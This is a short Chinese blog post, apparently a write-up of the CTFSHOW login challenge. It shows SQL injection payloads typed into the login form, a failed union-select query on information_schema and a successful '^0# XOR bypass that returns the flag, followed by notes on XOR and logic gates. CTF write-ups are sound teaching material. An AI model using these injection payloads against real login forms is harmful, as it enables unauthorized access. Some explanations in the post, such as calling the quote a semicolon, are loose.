---
title: CTF题目WP
date: 2025-10-25 01:00:38
tags:
---
## CTFSHOW 登陆就有flag

## 解题思路
+ 第一步
  打开题目发现
  ![屏幕截图](images/屏幕截图 D:\myblog\source\images 2025-10-19 202757)
  这个页面，此时考虑注入，输入：`admin' or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = '登录就有flag'),3 limit 1,2;#--`
  发现
  ![屏幕截图](images/屏幕截图 D:\myblog\source\images 2025-10-19 203013.png)
  找不到

+ 第二步
  找不到表数量，考虑特殊的  '^0#
  输入后得到flag   ctfshow{48dbf4cd-7f38-4de5-8e02-0d687fc6c349}

# 知识点
 ‘  分号用于闭合
^  进行异或运算
（异或运算（XOR）是一种逻辑运算，其规则是：如果两个值不同，结果为1；如果两个值相同，结果为0。在二进制中，0⊕0=0，1⊕0=1，0⊕1=1，1⊕1=0。
经过非门取反0-1 1-0   
与门有一个为0则为0两个为1则为1  
或门 通过逻辑加得出结果
异或运算的性质：
交换律：a⊕b = b⊕a。
​结合律：(a⊕b)⊕c = a⊕(b⊕c)。
​自反性：a⊕a = 0。
​零值：a⊕0 = a。
  


  
